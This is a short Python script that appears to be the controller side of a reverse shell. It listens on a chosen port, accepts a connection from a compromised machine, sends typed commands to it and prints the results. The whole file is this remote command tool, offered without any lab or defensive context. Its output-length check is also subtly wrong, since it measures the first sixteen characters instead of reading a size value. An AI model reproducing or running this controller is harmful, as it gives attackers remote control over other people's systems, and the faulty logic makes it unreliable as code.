import socket 
import sys

host=str(sys.argv[1])
port=int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(50)
conn, addr = s.accept()

print("connection from {}".format(str(addr[0])))

while 1:
    command = input("#> ")
    if command != "exit":
        if command == "": continue
        conn.send(command.encode('utf-8'))
        result = conn.recv(1024).decode('utf-8')
        total_size = len(result[:16])
        result = result[16:]
        while total_size > len(result):
            data = conn.recv(1024).decode('utf-8')
            result+=data
            
        msg = result.strip().splitlines()
        print("{}".format(msg))
     
    else:
        exit = "exit"
        conn.sendall(exit.encode('utf-8'))
        print("Shell is down!")
        break
s.close()
